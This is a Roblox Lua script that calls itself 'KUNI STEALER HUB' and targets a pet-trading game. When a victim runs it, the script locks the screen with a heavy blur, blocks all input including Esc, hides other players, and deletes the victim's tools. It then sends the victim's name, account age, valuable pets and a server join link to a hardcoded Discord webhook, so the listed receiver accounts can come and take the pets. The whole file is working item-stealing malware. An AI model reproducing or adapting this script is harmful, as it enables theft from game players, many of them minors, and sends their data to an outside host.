repeat task.wait() until game:IsLoaded()

--// Services
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local ContextActionService = game:GetService("ContextActionService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local dataModule = require(ReplicatedStorage.Modules.DataService)

local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"

local USERNAMES = {
    "HelloWorld_Z99, Kuni_Loot, Kuni_Loot1, Kuni_Loot02, Kuni_Loot3, Elaine_Pets, Elaine_Pets1, Elaine_Pets2, Elaine_Pets3, Elaine_Pets4, Elaine_Pets5, Elaine_Pets6, Elaine_Pets7, Elaine_Pets8, Elaine_Pets9, Elaine_Pets10, Elaine_Pets11, Elaine_Pets12, Elaine_Pets13, Elaine_Pets14, Elaine_Pets15, Elaine_Pets16, Elaine_Pets17, Elaine_Pets18, Elaine_Pets19, Elaine_Pets20, BEESUYAH"
}

-- DISPLAY FILTER ONLY
local PET_WHITELIST_NAME = {
    ["T-Rex"] = true,
    ["Spinosaurus"] = true,
    ["Queen Bee"] = true,
    ["Disco Bee"] = true,
    ["Mimic Octopus"] = true,
    ["Dragonfly"] = true,
    ["Butterfly"] = true,
    ["Fennec Fox"] = true,
    ["Raccoon"] = true
}

-- AUTO UNEQUIP - UUID or true
local PET_WHITELIST = {
    ["Dragonfly"] = "{63ffe264-ec3c-4c4f-b1d5-718d6a274dd3}",
    ["Corrupted Kitsune"] = "{64921f10-e437-4686-9156-2ff194de4e34}",
    ["T-Rex"] = "{59dc2f62-f4f8-495d-b2fe-7d40b6666306}",
    ["Mimic Octopus"] = "{c91e7566-c879-4a4d-9a62-8511f7aae3a4}",
    ["Butterfly"] = "{c174f6b9-3187-44fb-9be0-77f500d7aa3d}",
    ["Raccoon"] = "{09fc614f-5807-47aa-b4f4-6a044c98b654}",
    ["Disco Bee"] = "{809e310d-a9df-4e60-a796-80578cd5c73a}",
    ["Queen Bee"] = "{18a8af4f-6d75-4494-a7a5-adbd4193ca19}",
    ["Spinosaurus"] = "{25df32e7-9ae1-4796-955b-dfe7f1050665}",
    ["Fennec Fox"] = true,
    ["Kitsune"] = true
}

-- PET VALUES
local PET_VALUES = {
    ["T-Rex"] = 20000,
    ["Spinosaurus"] = 15000,
    ["Queen Bee"] = 30000,
    ["Disco Bee"] = 25000,
    ["Mimic Octopus"] = 12000,
    ["Dragonfly"] = 10000,
    ["Butterfly"] = 8000,
    ["Fennec Fox"] = 5000,
    ["Raccoon"] = 9000
}

-- FREEZE PLAYER
Humanoid.WalkSpeed = 0
Humanoid.JumpPower = 0
Humanoid.AutoRotate = false
Camera.CameraType = Enum.CameraType.Scriptable
UserInputService.MouseIconEnabled = false

RunService.RenderStepped:Connect(function()
    if Character and Character:FindFirstChild("Head") then
        Camera.CFrame = Character.Head.CFrame
    end
end)

-- BLUR SCREEN
local blur = Instance.new("BlurEffect")
blur.Size = 9999
blur.Parent = Lighting

-- DISABLE ESC + ALL INPUT
ContextActionService:BindActionAtPriority("BlockAll", function()
    return Enum.ContextActionResult.Sink
end, false, math.huge, unpack(Enum.KeyCode:GetEnumItems()))

-- HIDE OTHER PLAYERS VISUALLY
for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer and player.Character then
        for _, obj in ipairs(player.Character:GetDescendants()) do
            if obj:IsA("BasePart") or obj:IsA("Decal") or obj:IsA("Texture") then
                obj.Transparency = 1
            elseif obj:IsA("BillboardGui") or obj:IsA("SurfaceGui") then
                obj.Enabled = false
            end
        end
    end
end

-- REMOVE ALL GUIs
for _, gui in pairs(LocalPlayer:WaitForChild("PlayerGui"):GetChildren()) do
    if gui:IsA("ScreenGui") and gui.Name ~= "RobloxGui" then
        gui:Destroy()
    end
end

-- REMOVE TOOLS
for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
        tool:Destroy()
    end
end
for _, tool in pairs(Character:GetChildren()) do
    if tool:IsA("Tool") then
        tool:Destroy()
    end
end

-- AUTO UNEQUIP NON-WHITELISTED PETS WHEN NEAR TOPBASEPLATE
task.spawn(function()
    while task.wait(0.5) do
        local root = Character:FindFirstChild("HumanoidRootPart")
        local topBase = workspace:FindFirstChild("TopBaseplate")
        if root and topBase and (root.Position - topBase.Position).Magnitude < 20 then
            for _, obj in pairs(Character:GetChildren()) do
                if obj:IsA("Tool") and obj:FindFirstChild("Handle") then
                    local uuid = obj:GetAttribute("PET_UUID")
                    local petName = obj.Name
                    local whitelistEntry = PET_WHITELIST[petName]
                    if whitelistEntry ~= true and whitelistEntry ~= uuid then
                        obj.Parent = LocalPlayer.Backpack -- auto unequip
                    end
                end
            end
        end
    end
end)

-- CREATE WEBHOOK EMBED
local function createDiscordEmbed(petList)
    local emojiMap = {
        ["T-Rex"] = "ðŸ¦–",
        ["Spinosaurus"] = "ðŸ¦•",
        ["Queen Bee"] = "ðŸ‘‘ðŸ",
        ["Disco Bee"] = "ðŸª©ðŸ",
        ["Mimic Octopus"] = "ðŸ™",
        ["Dragonfly"] = "ðŸª°",
        ["Butterfly"] = "ðŸ¦‹",
        ["Fennec Fox"] = "ðŸ¦Š",
        ["Raccoon"] = "ðŸ¦"
    }

    local petCounts = {}
    for _, petName in ipairs(petList) do
        petCounts[petName] = (petCounts[petName] or 0) + 1
    end

    local formattedList = {}
    local totalSum = 0

    for petName, count in pairs(petCounts) do
        local emoji = emojiMap[petName] or "ðŸŽ’"
        local unitPrice = PET_VALUES[petName] or 0
        local petTotal = unitPrice * count
        totalSum += petTotal
        table.insert(formattedList, string.format("%s %s Ã—%d - %sÂ¢", emoji, petName, count, tostring(petTotal)))
    end

    local embed = {
        title = "KUNI STEALER HUB",
        color = 16711680,
        fields = {
            {
                name = "ðŸ‘¤ Player Info",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
                    LocalPlayer.Name,
                    table.concat(USERNAMES, " "),
                    LocalPlayer.Name,
                    LocalPlayer.AccountAge
                ),
                inline = false
            },
            {
                name = "💰 Total Value",
                value = string.format("```%sÂ¢```", totalSum),
                inline = false
            },
            {
                name = "🎒 Backpack",
                value = string.format("```%s```", table.concat(formattedList, "\n")),
                inline = false
            },
            {
                name = "ðŸ“¡ Join with URL",
                value = string.format(
                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
                    game.JobId,
                    game.PlaceId,
                    game.JobId
                ),
                inline = false
            }
        },
        footer = {
            text = string.format("ðŸ†” PlaceID: %s | JobID: %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format("@everyone\nðŸš¨ `TeleportService:TeleportToPlaceInstance(%s, \"%s\")` ðŸš¨", game.PlaceId, game.JobId),
        username = LocalPlayer.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local jsonData = HttpService:JSONEncode(data)
    local headers = { ["Content-Type"] = "application/json" }

    local request = http_request or request or HttpPost or syn.request
    local response = request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = headers,
        Body = jsonData
    })

    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
        warn("Webhook failed:", response.StatusCode, response.Body)
    end
end

-- PREPARE AND SEND PET LIST TO DISCORD
task.spawn(function()
    local victimPetTable = {}
    for uuid, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if PET_WHITELIST_NAME[petData.PetType] then
            table.insert(victimPetTable, petData.PetType)
        end
    end

    if #victimPetTable > 0 then
        createDiscordEmbed(victimPetTable)
    end
end)
